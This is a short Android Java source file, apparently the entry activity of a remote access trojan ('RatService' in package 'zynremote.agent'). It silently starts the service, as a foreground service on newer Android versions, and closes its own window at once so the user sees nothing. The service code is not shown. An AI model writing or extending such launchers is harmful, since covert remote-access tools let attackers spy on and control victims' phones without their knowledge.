package com.zynremote.agent;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Запускаем сервис
        Intent i = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= 26)
            startForegroundService(i);
        else
            startService(i);

        finish();
    }
}
